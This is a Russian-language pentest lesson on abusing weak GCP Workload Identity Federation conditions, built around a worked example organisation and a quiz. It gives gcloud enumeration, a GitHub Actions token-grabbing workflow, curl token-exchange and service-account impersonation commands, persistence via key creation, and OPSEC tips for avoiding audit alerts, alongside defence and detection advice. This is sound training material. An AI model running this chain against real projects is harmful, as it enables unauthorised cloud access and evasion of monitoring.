---
id: cloud-gcp-wif
title: "Workload Identity Federation: подделка доверия внешнего IdP"
category: cloud
parent: cloud-gcp-deep
difficulty: hard
order: 3
tags: [cloud, gcp, workload-identity, federation, oidc, sts, impersonation]
prerequisites: [cloud-gcp-deep, cloud-gcp-iam]
useful_for:
  - "Атака на доверие CI/CD к GCP без статических ключей"
  - "Понимание OIDC/SAML-федерации в облаке"
  - "Пентест мульти-облачных пайплайнов"
estimated_minutes: 55
summary: "Как устроена Workload Identity Federation в GCP: пулы, провайдеры, маппинг атрибутов и условия. Как слабое условие доверия позволяет внешнему IdP получить GCP-токен и имперсонировать сервисный аккаунт."
---

## Зачем этот урок

Workload Identity Federation (WIF) в GCP позволяет внешним идентичностям — GitHub Actions, GitLab CI, AWS, Azure AD, Kubernetes — получать доступ к Google Cloud **без статических ключей**. Это правильная архитектура: вместо `service-account-key.json` в секретах CI используется короткоживущий OIDC-токен, который обменивается на GCP-токен. Но вся безопасность WIF держится на **условии доверия** (attribute condition). Если условие слишком широкое — например, проверяет только организацию, но не конкретный репозиторий и ветку, — любой форк или чужой репозиторий в этой организации получит GCP-доступ. Это один из самых недооценённых классов облачных уязвимостей. Урок — про устройство WIF, поиск слабых условий и практическую цепочку «внешний токен → GCP-токен → имперсонация SA».

## Как устроена Workload Identity Federation

Компоненты:

- **Workload Identity Pool** — контейнер для внешних идентичностей (`projects/<num>/locations/global/workloadIdentityPools/<pool>`).
- **Provider** — конкретный источник (OIDC, AWS, SAML, X.509). Для GitHub Actions — OIDC-провайдер с issuer `https://token.actions.githubusercontent.com`.
- **Attribute mapping** — как атрибуты внешнего токена превращаются в `google.subject` и `google.groups` и произвольные `attribute.*`. Например, `google.subject = assertion.sub`, `attribute.repository = assertion.repository`.
- **Attribute condition** — CEL-выражение, пропускающее только определённые токены, например `assertion.repository == 'myorg/myrepo' && assertion.ref == 'refs/heads/main'`.

Поток обмена:

1. Внешняя система выдаёт OIDC-токен (JWT) с `iss`, `aud`, `sub` и claims.
2. Вызов `sts.googleapis.com/v1/token` с `grant_type=urn:ietf:params:oauth:grant-type:token-exchange`, subject-token = внешний JWT.
3. STS проверяет provider и condition, возвращает **federated access token**.
4. Имперсонация сервисного аккаунта через `iamcredentials.googleapis.com` (нужно право `iam.workloadIdentityUser` на SA).

Типовые слабости:

- Condition проверяет только `assertion.repository_owner`, а не конкретный репозиторий.
- Condition отсутствует вовсе (пусто) — принимается любой токен провайдера.
- Маппинг `google.subject` берёт нестабильный claim.
- Провайдер принимает `aud` без проверки — токен, выпущенный для другой цели, тоже подходит.
- Роль `roles/iam.workloadIdentityUser` выдана на весь проект, а не на конкретный SA.

## Инструменты и команды

Разведка (если есть права):

```bash
# Пулы и провайдеры
gcloud iam workload-identity-pools list --location=global
gcloud iam workload-identity-pools providers list \
  --workload-identity-pool=my-pool --location=global

# Описание провайдера: issuer, mapping, condition
gcloud iam workload-identity-pools providers describe my-provider \
  --workload-identity-pool=my-pool --location=global \
  --format='value(oidc.issuerUri,attributeMapping,attributeCondition)'
```

Проверка, кто может имперсонировать SA:

```bash
gcloud iam service-accounts get-iam-policy app-gsa@my-project.iam.gserviceaccount.com \
  --format=json | jq '.bindings[] | select(.role=="roles/iam.workloadIdentityUser")'
```

Обмен токена вручную (для проверки условия):

```bash
# external_token — JWT от внешнего IdP
curl -s -X POST "https://sts.googleapis.com/v1/token" \
  -H "Content-Type: application/json" \
  -d '{
    "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
    "audience": "//iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/my-pool/providers/my-provider",
    "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
    "subjectToken": "'"$EXTERNAL_TOKEN"'",
    "scope": "https://www.googleapis.com/auth/cloud-platform"
  }'
# => {"access_token":"ya29...","issued_token_type":"...","token_type":"Bearer"}
```

Имперсонация:

```bash
curl -s -X POST -H "Authorization: Bearer $FEDERATED_TOKEN" -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/app-gsa@my-project.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}'
```

## Разобранный пример: слабое условие доверия

Сценарий: организация `acme` использует GitHub Actions с WIF. Провайдер настроен с condition `assertion.repository_owner == 'acme'`.

Шаг 1 — находим провайдера и условие (через утекшие конфиги, публичный репозиторий с workflow, или права `iam.workloadIdentityPools.get`):

```bash
gcloud iam workload-identity-pools providers describe github \
  --workload-identity-pool=gh --location=global \
  --format='value(attributeCondition)'
# assertion.repository_owner == 'acme'
```

Шаг 2 — понимаем слабость: любой репозиторий под `acme`, включая форк или созданный участником организации, получит токен. Если у вас есть право создавать репозиторий в `acme` (или форкнуть публичный), вы можете запустить workflow с запросом OIDC-токена.

Шаг 3 — получаем OIDC-токен из своего workflow:

```yaml
permissions:
  id-token: write
  contents: read
jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/gh/providers/github" | jq -r .value)
          echo "$TOKEN" > token.jwt
```

Шаг 4 — обмениваем на federated token (команда выше). Условие проходит, потому что `repository_owner == 'acme'`.

Шаг 5 — имперсонируем SA, на который выдана роль `workloadIdentityUser`. Если она выдана на уровне проекта, подойдёт любой SA проекта, включая привилегированный.

Шаг 6 — от имени SA читаем Secrets/Storage или выпускаем ключ для персистентности.

Цепочка: `fork/PR в org → GitHub OIDC token → STS exchange (condition passes) → impersonate SA → project access`.

## Варианты атак и обходы

- **Condition на `repository_owner`.** Самый частый мисконфиг: организация большая, и вы можете создать репозиторий/форк.
- **Condition на `ref` без `repository`.** Проверка `refs/heads/main` не мешает другому репозиторию.
- **Отсутствие condition.** Любой токен провайдера принимается.
- **`pull_request_target`.** Workflow на этом триггере исполняется с секретами базового репозитория; в сочетании с WIF это даёт токен без ревью.
- **Слабый `aud`.** Если провайдер не проверяет audience, токен, выпущенный для другого сервиса, подойдёт.
- **AWS/Azure provider.** GCP-провайдер типа AWS проверяет подпись `GetCallerIdentity`; если у вас есть креды любого AWS-аккаунта, разрешённого в condition, — вход. Condition по `aws:accountId` без ограничения роли — слабость.
- **GKE Workload Identity pool.** Пул `<PROJECT>.svc.id.goog`; если KSA может имперсонировать GSA с широкими правами, компромисс пода = GCP-доступ.
- **SAML provider.** Ошибки в маппинге атрибутов SAML дают вход через подконтрольный IdP.

## Частые ошибки и подводные камни

- **Путать federated token и impersonated token.** Первый — от STS и ограничен правами на имперсонацию; второй — от `iamcredentials`.
- **Забывать про `iam.workloadIdentityUser`.** Без него имперсонация не сработает, даже если condition пройден.
- **Считать condition обязательным.** Он может быть пустым — тогда принимается всё.
- **Игнорировать аудиторию.** Неправильный `aud` приведёт к ошибке exchange.
- **Пробовать без внешнего токена.** Обмен требует реального JWT от провайдера; подделка подписи не пройдёт.
- **Не проверять, на что выдан `workloadIdentityUser`.** Он может быть на конкретный SA (тогда цель узкая) или на проект (тогда выбор широк).

## Защита и детект

- **Узкие условия.** `assertion.repository == 'acme/repo' && assertion.ref == 'refs/heads/main'` вместо `repository_owner`.
- **Проверяйте `aud`.** Провайдер должен принимать только ожидаемую аудиторию.
- **Минимальная роль `workloadIdentityUser`.** Выдавайте на конкретный SA, а не на проект.
- **Разделяйте SA по назначению.** Не давайте CI-SA широких ролей; используйте отдельные SA для deploy/read.
- **Детект.** Cloud Audit Logs: `google.sts.v1.SecurityTokenService.ExchangeToken`, `GenerateAccessToken` с principal типа `principalSet://...workloadIdentityPools/...`. Алерты на exchange из неожиданных репозиториев/веток, на имперсонацию вне CI.
- **Org policy.** Ограничивайте внешних участников и создание ключей.

## WIF в GKE и в других облаках

Кроме GitHub/GitLab, WIF используется для:

- **GKE Workload Identity.** Пул `<PROJECT>.svc.id.goog`; под имперсонирует GSA. Атака: компромисс пода → `iam.workloadIdentityUser` на GSA → доступ. Слабый маппинг KSA→GSA на широкий GSA — типовая находка.
- **AWS→GCP.** Провайдер типа AWS: любой, у кого есть AWS-креды разрешённого аккаунта, может обменять подписанный `GetCallerIdentity` на GCP-токен. Если condition проверяет только `aws:accountId`, а не конкретную роль — вход для любого в аккаунте.
- **Azure→GCP.** Аналогично через OIDC Azure AD: condition по `tenantId` без проверки приложения/группы слаб.
- **SAML-провайдеры.** Корпоративные IdP: ошибка в маппинге `google.subject` или отсутствие проверки атрибута даёт вход.

Общее правило: чем меньше claim-ов проверяет condition, тем шире вход. Наилучшая практика — комбинация конкретного репозитория/аккаунта, ветки/роли и аудитории.

## Практический чек-лист проверки WIF

При оценке проекта ищите такие признаки и проверяйте их:

1. Есть ли пулы и провайдеры (`workload-identity-pools list`) — если да, выпишите все.
2. Для каждого провайдера — issuer, attribute mapping и **attribute condition**. Пустой condition — красный флаг.
3. Кто имеет `roles/iam.workloadIdentityUser` и на каком уровне (проект/SA). Роль на проекте — широко.
4. Какие SA можно имперсонировать и какие у них роли.
5. Есть ли GKE-пул `<PROJECT>.svc.id.goog` и какие GSA к нему привязаны.
6. Есть ли AWS/Azure/SAML-провайдеры и насколько узкие их условия.
7. Можете ли вы получить внешний токен, удовлетворяющий condition (форк, репозиторий в org, AWS-креды аккаунта).

Этот чек-лист превращает WIF из «сложной темы» в список конкретных проверок, каждая из которых даёт понятный результат.

## OPSEC и что остаётся в логах

Обмен токена фиксируется в Cloud Audit Logs как `google.sts.v1.SecurityTokenService.ExchangeToken`, а имперсонация — как `GenerateAccessToken`/`GenerateIdToken` с principal вида `principalSet://iam.googleapis.com/projects/<num>/locations/global/workloadIdentityPools/<pool>/...`. Эти записи — прямой след вашей цепочки. Практические соображения: минимизируйте число обменов, не создавайте новых пулов/провайдеров (это громкие `create` события), не выпускайте ключи SA без необходимости (каждое `CreateServiceAccountKey` легко алертится). Если вы используете форк репозитория для получения токена, ваш workflow тоже останется в логах GitHub. Для пентеста важен воспроизводимый путь; отметьте в отчёте, что защита может детектировать exchange по неожиданным репозиториям/веткам.

## Что дальше / решение

WIF — это доверие, и его можно обмануть, если условие слабое. После получения federated token: проверьте, на какие SA выдана `workloadIdentityUser`, имперсонируйте самый привилегированный, затем действуйте как обычно (Secrets, Storage, ключи). Если condition проверяет только организацию — ищите способ получить токен от любого репозитория в ней. Если провайдер типа AWS/Azure — ищите допустимый аккаунт. Записывайте цепочку как attack step: она часто связывает CI/CD-компромисс с облачным доступом и объясняет, почему статические ключи не нужны.

## Квиз

```quiz
- question: "Что защищает Workload Identity Federation от произвольных внешних токенов?"
  options:
    - "Attribute condition (CEL-выражение)"
    - "Пароль сервисного аккаунта"
    - "SAS-токен"
    - "IMDSv2"
  answer: 0
  explanation: "Condition фильтрует, какие внешние токены принимаются."
- question: "Какой condition самый слабый?"
  options:
    - "assertion.repository_owner == 'acme'"
    - "assertion.repository == 'acme/repo' && assertion.ref == 'refs/heads/main'"
    - "assertion.repository == 'acme/repo'"
    - "assertion.sub == 'repo:acme/repo:ref:refs/heads/main'"
  answer: 0
  explanation: "Проверка только владельца допускает любой репозиторий организации."
- question: "Какое право нужно для имперсонации SA после обмена токена?"
  options:
    - "iam.workloadIdentityUser на сервисный аккаунт"
    - "storage.objects.get"
    - "compute.instances.get"
    - "logging.viewer"
  answer: 0
  explanation: "workloadIdentityUser (или roles/iam.workloadIdentityUser) разрешает имперсонацию."
- question: "Что проверяет провайдер типа AWS в GCP WIF?"
  options:
    - "Подпись GetCallerIdentity от AWS"
    - "Пароль AWS"
    - "SAS-токен"
    - "JWT от GitHub"
  answer: 0
  explanation: "AWS-провайдер валидирует ответ sts:GetCallerIdentity, подтверждая AWS-идентичность."
```

## Где пригодится

- **Red team:** атака на CI/CD, доверяющий GCP без ключей.
- **Пентест GCP:** анализ федерации и имперсонации.
- **Bug bounty:** мисконфиги WIF в публичных репозиториях.
- **Blue team:** аудит условий доверия и алерты на exchange.
